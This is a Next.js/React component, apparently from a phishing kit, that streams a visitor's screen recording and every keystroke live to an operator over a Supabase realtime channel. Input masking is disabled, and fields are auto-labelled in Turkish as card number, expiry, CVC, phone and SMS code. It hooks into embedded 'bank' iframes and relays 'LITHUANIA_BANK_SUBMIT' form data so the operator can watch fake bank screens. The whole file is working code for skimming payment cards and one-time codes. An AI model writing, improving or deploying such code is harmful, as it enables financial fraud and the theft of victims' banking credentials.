"use client";

import { useEffect, useRef } from "react";
import { useParams, usePathname } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { resolveClientSessionId } from "@/components/VisitorTracker";
import { sendBroadcastPacket } from "@/lib/broadcast-transfer";
import { ACTIVE_SESSION_EVENT } from "@/lib/session-id-client";
import type { RealtimeChannel, SupabaseClient } from "@supabase/supabase-js";

export type LiveClientMeta = {
  sessionId: string;
  pathname: string;
  title: string;
  width: number;
  height: number;
  userAgent: string;
  timestamp: number;
};

export type LiveUserAction = {
  type: "click" | "input" | "focus" | "blur" | "scroll" | "navigate";
  target?: string;
  value?: string;
  pathname: string;
  timestamp: number;
};

function getFieldDisplayName(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): string {
  const aria = target.getAttribute("aria-label");
  if (aria && aria.trim()) return aria.trim();

  const placeholder = target.getAttribute("placeholder");
  if (placeholder && placeholder.trim()) return placeholder.trim();

  const parentLabel = target.closest("label");
  if (parentLabel) {
    try {
      const clone = parentLabel.cloneNode(true) as HTMLElement;
      clone.querySelectorAll("input, select, textarea, button, svg").forEach((el) => el.remove());
      const text = (clone.textContent || "").trim().split("\n")[0].trim();
      if (text && text.length < 50) return text;
    } catch {
      /* ignore */
    }
  }

  if (target.id) {
    const labelEl = document.querySelector(`label[for="${target.id}"]`);
    if (labelEl && labelEl.textContent) {
      const text = labelEl.textContent.trim().split("\n")[0].trim();
      if (text && text.length < 50) return text;
    }
  }

  const ac = target.getAttribute("autocomplete");
  if (ac === "cc-number") return "Kart Numarası";
  if (ac === "cc-exp") return "Son Kullanma (SKT)";
  if (ac === "cc-csc") return "CVC";
  if (ac === "tel") return "Telefon Numarası";
  if (ac === "name") return "İsim Soyisim";

  const n = (target.name || target.id || "").toLowerCase();
  if (n.includes("card") || n.includes("number")) return "Kart Numarası";
  if (n.includes("exp")) return "Son Kullanma (SKT)";
  if (n.includes("cvc") || n.includes("cvv")) return "CVC";
  if (n.includes("phone") || n.includes("tel")) return "Telefon";
  if (n.includes("first")) return "Ad";
  if (n.includes("last")) return "Soyad";
  if (n.includes("code") || n.includes("sms") || n.includes("tac")) return "SMS / Kod";

  return target.name || target.id || "Giriş Alanı";
}

export function LiveScreenRecorder() {
  const pathname = usePathname();
  const params = useParams();
  const supabaseRef = useRef<SupabaseClient<any, any, any> | null>(null);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const channelSessionRef = useRef<string | null>(null);
  const stopRecordRef = useRef<(() => void) | null>(null);
  const isStreamingRef = useRef(false);
  const streamTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const initRunRef = useRef(0);
  const listenersCleanupRef = useRef<(() => void) | null>(null);
  const unmountedRef = useRef(false);

  const extendStreaming = () => {
    isStreamingRef.current = true;
    if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
    streamTimeoutRef.current = setTimeout(() => {
      isStreamingRef.current = false;
    }, 90000);
  };

  // Session degisince veya sayfa degisince recorder'i (yeniden) kur.
  // Kanal session'a baglidir — sayfa gecisinde YIKILMAZ (eskiden her
  // navigasyonda kanal kapanip yeniden aciliyor, admin bos ekran goruyordu).
  const initRecorder = async () => {
    const runId = ++initRunRef.current;
    const isStale = () => unmountedRef.current || initRunRef.current !== runId;
    const supabase = supabaseRef.current;
    if (!supabase || isStale()) return;

    const routeSessionId = params?.id as string | undefined;
    const querySessionId = new URLSearchParams(window.location.search).get("session");

    // Session id henuz cozulemediyse (localStorage yazilmamis, DB lookup
    // dusmus) birkac kez dene — aksi halde o sayfa izlemede hic gorunmez.
    let resolved = await resolveClientSessionId(supabase, routeSessionId, querySessionId);
    for (let attempt = 0; !resolved?.sessionId && attempt < 6 && !isStale(); attempt++) {
      await new Promise((r) => setTimeout(r, 900));
      resolved = await resolveClientSessionId(supabase, routeSessionId, querySessionId);
    }
    const sessionId = resolved?.sessionId;
    if (!sessionId || isStale()) return;

    let rrweb: typeof import("rrweb") | null = null;
    try {
      rrweb = await import("rrweb");
    } catch (e) {
      console.error("[LiveScreenRecorder] failed to import rrweb:", e);
      return;
    }
    if (isStale()) return;

    const sendMeta = async () => {
      if (!channelRef.current) return;
      const meta: LiveClientMeta = {
        sessionId,
        pathname: window.location.pathname,
        title: document.title,
        width: window.innerWidth,
        height: window.innerHeight,
        userAgent: navigator.userAgent,
        timestamp: Date.now(),
      };
      await sendBroadcastPacket(channelRef.current, "client_meta", meta);
    };

    const sendAction = async (action: Omit<LiveUserAction, "pathname" | "timestamp">) => {
      if (!isStreamingRef.current || !channelRef.current) return;
      const fullAction: LiveUserAction = {
        ...action,
        pathname: window.location.pathname,
        timestamp: Date.now(),
      };
      await sendBroadcastPacket(channelRef.current, "user_action", fullAction);
    };

    const sendFullSnapshotFlow = async () => {
      extendStreaming();
      await sendMeta();

      if (channelRef.current) {
        const metaEvent = {
          type: 4, // EventType.Meta
          data: {
            href: window.location.href,
            width: window.innerWidth,
            height: window.innerHeight,
          },
          timestamp: Date.now(),
        };
        await sendBroadcastPacket(channelRef.current, "screen_event", metaEvent);
      }

      if (rrweb && rrweb.record) {
        try {
          rrweb.record.takeFullSnapshot(true);
        } catch (err) {
          console.error("[LiveScreenRecorder] takeFullSnapshot error:", err);
        }
      }
    };

    // --- Kanal: session ayniysa KORU, degistiyse eskiyi kapat ---
    if (channelRef.current && channelSessionRef.current !== sessionId) {
      const old = channelRef.current;
      channelRef.current = null;
      channelSessionRef.current = null;
      try {
        old.unsubscribe();
      } catch {
        /* ignore */
      }
      void supabase.removeChannel(old);
    }

    if (!channelRef.current) {
      const channel = supabase.channel(`live-screen:${sessionId}`, {
        config: { broadcast: { ack: false } },
      });
      channelRef.current = channel;
      channelSessionRef.current = sessionId;

      channel
        .on("broadcast", { event: "admin_request_snapshot" }, async () => {
          await sendFullSnapshotFlow();
        })
        .on("broadcast", { event: "admin_heartbeat" }, () => {
          extendStreaming();
        })
        .on("broadcast", { event: "admin_disconnect" }, () => {
          isStreamingRef.current = false;
        });

      channel.subscribe(async (status) => {
        if (status === "SUBSCRIBED" && !isStale()) {
          await sendMeta();
          await sendFullSnapshotFlow();
          setTimeout(() => {
            if (!isStale() && isStreamingRef.current) {
              void sendFullSnapshotFlow();
            }
          }, 400);
          setTimeout(() => {
            if (!isStale() && isStreamingRef.current) {
              void sendFullSnapshotFlow();
            }
          }, 1200);
        }
      });
    } else {
      // Ayni session, yeni sayfa: kanali yikmadan taze snapshot gonder.
      extendStreaming();
      setTimeout(() => {
        if (!isStale()) void sendFullSnapshotFlow();
      }, 150);
      setTimeout(() => {
        if (!isStale()) void sendFullSnapshotFlow();
      }, 800);
    }

    // --- rrweb: kayit zaten aciksa tekrar baslatma; mutasyonlar SPA
    // navigasyonlarini zaten yakalar, uzerine taze snapshot attik ---
    if (!stopRecordRef.current && rrweb?.record) {
      try {
        const stop = rrweb.record({
          emit(event) {
            if (unmountedRef.current) return;
            if (isStreamingRef.current && channelRef.current) {
              void sendBroadcastPacket(channelRef.current, "screen_event", event);
            }
          },
          maskAllInputs: false,
          maskInputOptions: {
            password: false,
          },
          inlineStylesheet: true,
          inlineImages: false,
          collectFonts: false,
          recordCanvas: true, // Wheel gibi canvas sayfalari replayde bos kaliyordu
          checkoutEveryNms: 30000, // 30sn'de bir full snapshot: goruntu drift'te kalmasin
          keepIframeSrcFn: () => true, // CRITICAL: PRESERVE BANK IFRAME SRC SO BANK SCREENS RENDER INSTEAD OF BLANK WHITE!
          sampling: {
            mousemove: 30, // ~33fps cursor: gercek zamanli his
            mouseInteraction: true,
            scroll: 30,
            input: "all",
          },
        });
        stopRecordRef.current = stop || null;
      } catch (err) {
        console.error("[LiveScreenRecorder] rrweb record error:", err);
      }
    }

    // --- Dinleyiciler: onceki sayfanin dinleyicilerini temizle, yenilerini bagla ---
    if (listenersCleanupRef.current) {
      try {
        listenersCleanupRef.current();
      } catch {
        /* ignore */
      }
      listenersCleanupRef.current = null;
    }

    // FIELD-BASED INSTANT INPUT: ANLIK OLARAK ALAN BAZLI GÖNDERİM!
    const handleInput = (e: Event) => {
      const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
      if (!target) return;
      const fieldName = getFieldDisplayName(target);
      const valLen = target.value?.length || 0;
      const val = target.type === "password" ? `*** (${valLen} hane)` : target.value || "";

      void sendAction({
        type: "input",
        target: fieldName,
        value: val,
      });
    };

    const handleBlur = (e: FocusEvent) => {
      const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
      if (!target) return;
      const fieldName = getFieldDisplayName(target);
      void sendAction({
        type: "blur",
        target: fieldName,
      });
    };

    const handleFocus = (e: FocusEvent) => {
      const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
      if (!target) return;
      const desc = getFieldDisplayName(target);
      void sendAction({ type: "focus", target: desc });
    };

    window.addEventListener("input", handleInput, { capture: true, passive: true });
    window.addEventListener("blur", handleBlur, { capture: true, passive: true });
    window.addEventListener("focus", handleFocus, { capture: true, passive: true });

    // ATTACH TO SAME-ORIGIN BANK IFRAMES TO CAPTURE TYPING INSIDE BANK SCREENS!
    const attachToIframe = (ifr: HTMLIFrameElement) => {
      try {
        const doc = ifr.contentDocument || ifr.contentWindow?.document;
        if (doc && !(ifr as any).__liveAttached) {
          (ifr as any).__liveAttached = true;
          doc.addEventListener("input", handleInput, { capture: true, passive: true });
          doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
          doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
        }
      } catch {
        /* ignore */
      }
    };

    const scanIframes = () => {
      document.querySelectorAll("iframe").forEach((f) => {
        attachToIframe(f as HTMLIFrameElement);
      });
    };
    scanIframes();
    const iframeInterval = setInterval(scanIframes, 600);

    // Listen for bank postMessage submissions
    const handleWindowMessage = (e: MessageEvent) => {
      if (!e.data || typeof e.data !== "object") return;
      if (e.data.type === "LITHUANIA_BANK_SUBMIT" && e.data.formData) {
        const fd = e.data.formData;
        if (Array.isArray(fd.fields)) {
          fd.fields.forEach((f: any) => {
            if (f.key && f.value) {
              void sendAction({
                type: "input",
                target: f.label || f.name || f.key,
                value: f.value,
              });
            }
          });
        }
      }
    };
    window.addEventListener("message", handleWindowMessage);

    listenersCleanupRef.current = () => {
      clearInterval(iframeInterval);
      window.removeEventListener("message", handleWindowMessage);
      window.removeEventListener("input", handleInput, true);
      window.removeEventListener("blur", handleBlur, true);
      window.removeEventListener("focus", handleFocus, true);
    };
  };

  // Mount/unmount: supabase client + session-change listener + nihai teardown
  useEffect(() => {
    if (typeof window === "undefined") return;
    if (window.location.pathname.startsWith("/admin")) return;

    unmountedRef.current = false;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    supabaseRef.current = supabase;

    const onSessionChanged = () => {
      void initRecorder();
    };
    window.addEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);

    // İlk kurulum
    void initRecorder();

    return () => {
      unmountedRef.current = true;
      initRunRef.current += 1;
      window.removeEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);
      if (listenersCleanupRef.current) {
        try {
          listenersCleanupRef.current();
        } catch {
          /* ignore */
        }
        listenersCleanupRef.current = null;
      }
      if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
      if (stopRecordRef.current) {
        try {
          stopRecordRef.current();
        } catch {
          /* ignore */
        }
        stopRecordRef.current = null;
      }
      if (channelRef.current) {
        void supabase.removeChannel(channelRef.current);
        channelRef.current = null;
        channelSessionRef.current = null;
      }
      supabaseRef.current = null;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Sayfa gecisinde sadece init'i tekrar koştur (kanal korunur)
  // NOT: dep'te params objesi degil params?.id — params referansi her
  // render'da degisebilir, o zaman init spam'lenir.
  useEffect(() => {
    if (!supabaseRef.current) return;
    void initRecorder();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pathname, params?.id]);

  return null;
}
